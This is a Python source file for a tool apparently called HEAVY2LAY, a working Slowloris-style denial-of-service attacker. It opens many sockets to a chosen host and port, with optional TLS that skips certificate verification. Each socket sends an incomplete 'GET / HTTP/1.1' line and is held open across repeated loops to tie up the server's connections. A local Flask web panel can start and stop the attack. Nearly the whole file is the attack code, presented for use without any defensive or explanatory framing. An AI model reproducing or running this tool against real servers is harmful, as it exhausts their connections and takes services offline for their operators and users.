#!/usr/bin/python3
import json
import os
import struct
import parse
import sys
import out
import threading
import time
import socket
import platform
import ssl
import config

cleanout_lite = '                    \x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D'
cleanout = cleanout_lite

cleanout_lite = ''
windows = True if platform.system() == 'Windows' else False
if windows:
    out.p('ATTENTION: You\'re running HEAVY2LAY on Windows. Animations and colors work incorrectly')
    cleanout_lite = '                    '
else:
    cleanout_lite = '                    \x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D'

cleanout = cleanout_lite
symbols = [
    '>>>>', ' >>>', '> >>', '>> >', '>>> '
]
animworks = False
animtext = 'WARNING: NO ANIMATION TEXT'
def animation():
    s = 0
    while True:
        if not animworks:
            break
        if not windows:
            out.p(f'\r\x1b[3;31m{symbols[s]}\x1b[0m {animtext}', end='')
        else:
            out.p(f'\r{symbols[s]} {animtext}', end='')
        time.sleep(0.1)
        s += 1
        if s == len(symbols):
            s = 0

parser = parse.Parser(sys.argv)
parser.add_arg('help', '--help', xtype=parse.T_BOOL)
parser.add_arg('host', '-h', xtype=parse.T_STRING)
parser.add_arg('port', '-p', xtype=parse.T_INT)
parser.add_arg('sockets', '-s', xtype=parse.T_INT, default=100)
parser.add_arg('https', '--https', xtype=parse.T_BOOL)
parser.add_arg('sleeptime', '-S', xtype=parse.T_INT, default=15)
parser.add_arg('webinterface', '-w', xtype=parse.T_BOOL, default=False)
args = parser.parse()

stop = False
animtext = 'Starting workers'
animworks = True
def dos(host, port, https, web, sockets, sleeptime):
    global animtext, animworks, stop
    stop = False
    # web = False # TODO: DELETE OR COMMENT THIS LINE !!!
    loop_amount = 0
    animthread = threading.Thread(target=animation)
    if not web:
        animthread.start()
    else:
        out.info(f'Starting attack to {host}:{port}')
    sleeping = -1
    alive_sockets = []
    refused = 0
    while True:
        if stop: out.warn(config.msg_http_stop); break
        stop_creating = False
        try:
            if sleeping == -1:
                loop_amount += 1
                refused = 0
                if web:
                    out.info(f'LOOP #{loop_amount}')
                for _ in range(sockets):
                    if stop: out.warn(config.msg_http_stop); break
                    animtext = f'CREATING WORKER {_+1}/{sockets}{" / REFUSED x" + str(refused) if refused > 0 else ""}{cleanout}'
                    if stop_creating == False:
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                            sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
                            sock.settimeout(3)
                            if https == True:
                                ctx = ssl.create_default_context()
                                ctx.check_hostname = False
                                ctx.verify_mode = ssl.CERT_NONE
                                sock = ctx.wrap_socket(sock, server_hostname=host)
                        except OSError as e:
                            out.error(f'OSError catched: {e}{cleanout}', left='\r')
                            sock.close()
                            stop_creating = True
                            refused += sockets - len(alive_sockets)
                            continue
                        try:
                            sock.connect((host, port))
                        except ConnectionRefusedError:
                            out.error('Connection Refused')
                            refused += 1
                            # animtext = f'CONNECTION REFUSED ERROR CATCHED ON WORKER {_+1}/{args["sockets"]}'
                            continue
                        except TimeoutError:
                            out.error(f'Time out{cleanout}{cleanout}', left='\r')
                            sock.close()
                            stop_creating = True
                            refused += sockets - len(alive_sockets)
                            continue
                        except socket.timeout:
                            out.error(f'Time out{cleanout}{cleanout}', left='\r')
                            sock.close()
                            stop_creating = True
                            refused += sockets - len(alive_sockets)
                            continue

                        except Exception as e:
                            out.error(f'Exception: {e}                         ', left='\r')
                            refused += 1
                            continue
                        alive_sockets.append(sock)
                        sock.send(f'GET / HTTP/1.1'.encode())
                        if web: out.done(f"CREATED WORKER x{len(alive_sockets) + refused}")
                sleeping = 0
                donetext = 0
                if refused == 0:
                    donetext = '\x1b[42mDONE  '
                elif refused > 0 and not len(alive_sockets) == 0:
                    donetext = '\x1b[43mDONE  '
                else:
                    donetext = '\x1b[41mREFUSE'
                if web: print(f'{donetext}\x1b[0m LOOP #{loop_amount} x{len(alive_sockets)} WORKERS{" / REFUSED x" + str(refused) if refused > 0 else ""}{cleanout}')
            else:
                animtext = f'SLEEPING ({sleeping}/{sleeptime}) (LOOP #{loop_amount}) x{len(alive_sockets)} WORKERS{" / REFUSED x" + str(refused) if refused > 0 else ""}{cleanout}'
                if web: out.info(f"SLEEPING x{sleeping}")
                time.sleep(1)
                sleeping += 1
                if sleeping == sleeptime or stop:
                    print(f'\r{donetext}\x1b[0m LOOP #{loop_amount} x{len(alive_sockets)} WORKERS{" / REFUSED x" + str(refused) if refused > 0 else ""}{cleanout}')
                    sleeping = -1
                    alive_sockets = []
        except KeyboardInterrupt:
            animworks = False
            i = 0
            for sock in alive_sockets:
                i += 1
                animtext = f'Closing socket {i}/{len(alive_sockets)}'
                sock.close()
            out.warn('Keyboard Interrupt catched!                            ', left='\r')
            sys.exit(0)

if args['help'] == True:
    out.p(config.msg_help)
    sys.exit(0)

if args['webinterface']:
    import flask, flask_cors
    import logging
    import webbrowser
    app = flask.Flask(__name__)
    flask_cors.CORS(app)
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    dosthread = None

    @app.route('/')
    def index():
        working = 'n'
        if stop: working = 'n'
        elif dosthread != None: working = 'y'
        return flask.render_template('index.html', working=working)
    @app.route('/start', methods=['POST'])
    def start():
        global dosthread
        data = flask.request.data.decode()
        form = json.loads(data)
        dosthread = threading.Thread(target=dos, args=(form['host'], int(form['port']), False, True, int(form['sockets']), int(form['sleeptime']),))
        dosthread.start()
        response = flask.Response('ok')
        response.headers.add('Access-Control-Allow-Origin', '*')
        return response
    @app.route('/stop')
    def stopwork():
        global stop
        stop = True
        return flask.redirect('/')
    # webbrowser.open('http://127.0.0.1:9670')
    if os.getenv('PREFIX', '').startswith('/data/data/com.termux'):
        os.system('am start -a android.intent.action.VIEW -d "http://localhost:9670"')
    else:
        webbrowser.open(os.path.join(os.getcwd(), 'openweb.html'))
    out.info(f"Web Interface is listening on http://127.0.0.1:9670")
    app.run(host='127.0.0.1', port=9670, debug=False)
    sys.exit(0)

# if None in [args['host'], args['port']]:
if args['host'] == None:
    print(config.msg_help)
    sys.exit(1)

if args['port'] == None:
    args['port'] = 80 if not args['https'] else 443

dos(args['host'], args['port'], https=args['https'], web=args['webinterface'], sockets=args['sockets'], sleeptime=args['sleeptime'])
